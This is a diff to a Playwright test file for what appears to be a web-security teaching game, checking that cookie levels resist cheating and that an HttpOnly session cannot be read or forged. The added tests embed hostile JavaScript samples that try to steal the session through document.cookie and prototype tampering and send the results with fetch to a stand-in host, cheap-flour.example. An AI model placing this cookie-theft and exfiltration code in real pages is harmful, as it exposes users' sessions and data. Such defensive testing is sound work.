@@ -14,7 +14,7 @@ import { runCheck } from './helpers/sandbox'
 // in a blank page.
 
 const run = (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Readonly<Record<string, string>>, probes: readonly Probe[] = level.sandbox.probes) =>
-  runCheck(page, files, probes, undefined, { web: level.sandbox.web })
+  runCheck(page, files, probes, undefined, { web: level.sandbox.web, page: level.sandbox.page })
 
 /** The files after a solution's edits. */
 function solvedFiles(level: WebLevel): Record<string, string> {
@@ -108,6 +108,15 @@ for (const level of webLevels) {
     expect(start.network).toEqual(table.start.network)
     expect(start.server).toEqual(table.start.server)
     expect(start.asks).toEqual(table.start.asks ?? [])
+    // chapter 2 (the levels with the Application panel): the cookies each request carried, the jar at the end, what
+    // was refused, what a script can read
+    const cookies = level.sandbox.web?.application === true
+    if (cookies) {
+      expect(start.sent).toEqual(table.start.sent ?? [])
+      expect(start.stored).toEqual(table.start.stored ?? [])
+      expect(start.refused).toEqual(table.start.refused ?? [])
+      expect(start.readable).toEqual(table.start.readable ?? [])
+    }
     const lines = start.entries.map(entry => entry.text)
     // what the texts quote (in any order: requests sent together may be answered in any order; an order question
     // checks its own lines' order below)
@@ -117,6 +126,10 @@ for (const level of webLevels) {
       if ('row' in fact) return start.network.includes(fact.row)
       if ('server' in fact) return start.server.includes(fact.server)
       if ('asks' in fact) return start.asks.some(asked => asked.split(',').includes(fact.asks))
+      if ('sent' in fact) return start.sent.includes(fact.sent)
+      if ('stored' in fact) return start.stored.includes(fact.stored)
+      if ('refused' in fact) return start.refused.includes(fact.refused)
+      if ('readable' in fact) return start.readable.includes(fact.readable)
       return lines.some(line => line.startsWith(fact.says))
     }
     for (const question of level.prediction.questions) {
@@ -140,6 +153,10 @@ for (const level of webLevels) {
     expect(solved.observation.errors).toHaveLength(table.solved!.errors)
     expect(solved.network).toEqual(table.solved!.network)
     expect(solved.server).toEqual(table.solved!.server)
+    if (cookies) {
+      expect(solved.sent).toEqual(table.solved!.sent ?? [])
+      expect(solved.stored).toEqual(table.solved!.stored ?? [])
+    }
     const results = await playWebSolution(level, files => run(page, level, files).then(result => result.observation))
     expect(results.at(-1)!.session.solved).toBe(true)
 
@@ -162,3 +179,102 @@ for (const level of webLevels) {
     })
   }
 }
+
+test.describe('an app can\'t read an HttpOnly cookie or forge one outside the cookie rules through any frame API (chapter 2)', () => {
+  const level = webLevels.find(each => each.id === 'web-08-script-reads-session')!
+  // reviews.js replaced by a widget that tries every way in, once Lena is signed in, and sends all it found away
+  const CHEAT = [
+    'document.querySelector(\'#reviews-open\').addEventListener(\'click\', async () => {',
+    '  const found = []',
+    '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
+    '  tryIt(\'cookie\', () => document.cookie)',
+    '  tryIt(\'native getter\', () => Object.getOwnPropertyDescriptor(Document.prototype, \'cookie\').get.call(document))',
+    '  tryIt(\'redefine\', () => Object.defineProperty(document, \'cookie\', { get: () => \'x\' }))',
+    '  tryIt(\'hostname\', () => { Object.defineProperty(URL.prototype, \'hostname\', { configurable: true, get() { return \'api.cornerbakery.shop\' } }); return document.cookie })',
+    '  tryIt(\'lower case\', () => { String.prototype.toLowerCase = function () { return \'api.cornerbakery.shop\' }; return document.cookie })',
+    '  tryIt(\'forge for the API\', () => { document.cookie = \'session=forged; Domain=api.cornerbakery.shop\'; return document.cookie })',
+    '  tryIt(\'forge HttpOnly\', () => { document.cookie = \'session=forged; HttpOnly; Domain=cornerbakery.shop\'; return document.cookie })',
+    '  const login = await fetch(\'https://api.cornerbakery.shop/login\', { method: \'POST\', credentials: \'include\', headers: { Cookie: \'session=forged\' }, body: new URLSearchParams({ email: \'lena@example.com\', password: \'croissant-42\' }) })',
+    '  found.push(\'set-cookie:\' + login.headers.get(\'set-cookie\'))',
+    '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
+    '})'
+  ].join('\n')
+
+  test('the session stays unread and unforged: nothing of it leaks, a replay is no session, a forged write is refused', async ({ page }) => {
+    await page.setContent('<!doctype html><title>check</title>')
+    const files = { ...solvedFiles(level), 'reviews.js': CHEAT }
+    const result = await run(page, level, files)
+    expect(result.observation.probes, JSON.stringify(result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example')).map(entry => decodeURIComponent(entry.url)))).toMatchObject({ who: 'Signed in as Lena', leaked: 0, stolen: 401 })
+    // the widget did run, and what it found reads as the rules say: document.cookie without the session, the browser's
+    // own getter refused (the sealed frame), no second definition, no Set-Cookie for the page
+    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
+    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
+    // (Chromium and Firefox throw SecurityError from the browser's own getter, WebKit gives an empty string)
+    expect(sent[0]).toMatch(/cookie=theme=dark\|native getter=(SecurityError)?\|redefine=TypeError\|/)
+    expect(sent[0]).toContain('set-cookie:null')
+    // the forged writes were refused by the model; the server.js session is the one Lena got
+    expect(result.refused).toEqual(expect.arrayContaining(['session']))
+    expect(result.stored.filter(name => name === 'session')).toHaveLength(1)
+    // a Cookie header set by the page is dropped (a forbidden header)
+    expect(result.requests.filter(entry => entry.url.endsWith('/login')).every(entry => !entry.requestHeaders.some(([name, value]) => name === 'cookie' && value.includes('forged')))).toBe(true)
+  })
+})
+
+test.describe('setters and getters the app puts on the prototypes change nothing the check measures, and read no HttpOnly cookie (chapter 2)', () => {
+  const csrf = webLevels.find(each => each.id === 'web-07-order-from-elsewhere')!
+  const widget = webLevels.find(each => each.id === 'web-08-script-reads-session')!
+  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
+    const result = await run(page, level, files)
+    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
+    return { solved: session.solved, result }
+  }
+  // put first into a file of the app, so the setters are there before Lena signs in
+  const before = (files: Record<string, string>, path: string, code: string) => ({ ...files, [path]: `${code}\n${files[path]!}` })
+
+  test('2.2: a url setter on Object.prototype that sends the attacks elsewhere solves nothing', async ({ page }) => {
+    await page.setContent('<!doctype html><title>check</title>')
+    const cheat = 'Object.defineProperty(Object.prototype, \'url\', { configurable: true, set(value) { Object.defineProperty(this, \'url\', { value: new URL(\'https://api.cornerbakery.shop/nowhere\'), writable: true, enumerable: true, configurable: true }) } })'
+    const { solved, result } = await solvedBy(page, csrf, before(startWebLevel(csrf).state.files, 'app.js', cheat))
+    expect(solved).toBe(false)
+    expect(result.observation.probes).toMatchObject({ attack: 201, other: 201, lookalike: 201 })
+  })
+
+  test('2.3: setters on array indices that mark the session HttpOnly solve nothing', async ({ page }) => {
+    await page.setContent('<!doctype html><title>check</title>')
+    const cheat = [
+      'const mark = (value) => {',
+      '  if (value && typeof value === \'object\' && value.name === \'session\') value.httpOnly = true',
+      '  if (value && typeof value === \'object\' && value.cookie && value.cookie.name === \'session\') value.cookie.httpOnly = true',
+      '}',
+      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, { configurable: true, set(value) { mark(value); Object.defineProperty(this, i, { value, writable: true, enumerable: true, configurable: true }) } })'
+    ].join('\n')
+    const { solved, result } = await solvedBy(page, widget, before(startWebLevel(widget).state.files, 'app.js', cheat))
+    expect(solved).toBe(false)
+    expect(result.observation.probes).toMatchObject({ stolen: 200 })
+  })
+
+  test('2.3 solved: a widget with setters on Array.prototype and Object.prototype reads nothing of the HttpOnly session', async ({ page }) => {
+    await page.setContent('<!doctype html><title>check</title>')
+    const cheat = [
+      'let seen = \'\'',
+      'const grab = (value) => {',
+      '  try {',
+      '    if (typeof value === \'string\') seen += `|${value}`',
+      '    else if (value && typeof value === \'object\') for (const key of [\'value\', \'cookie\', \'header\', \'line\']) { const found = Object.getOwnPropertyDescriptor(value, key); if (found && \'value\' in found) seen += `|${JSON.stringify(found.value)}` }',
+      '  } catch (error) { /* keep going */ }',
+      '}',
+      // descriptors without a prototype: the cheat's own setter for `value` would break plain ones
+      'const desc = fields => Object.assign(Object.create(null), fields)',
+      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, i, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
+      'for (const key of [\'cookie\', \'value\', \'name\', \'header\', \'line\', \'headers\']) Object.defineProperty(Object.prototype, key, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, key, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
+      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
+      '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(seen + \'|\' + document.cookie), { mode: \'no-cors\' })',
+      '})'
+    ].join('\n')
+    const { solved, result } = await solvedBy(page, widget, { ...solvedFiles(widget), 'reviews.js': cheat })
+    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect'))
+    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
+    expect(result.observation.probes).toMatchObject({ leaked: 0, stolen: 401 })
+    expect(solved).toBe(true)
+  })
+})
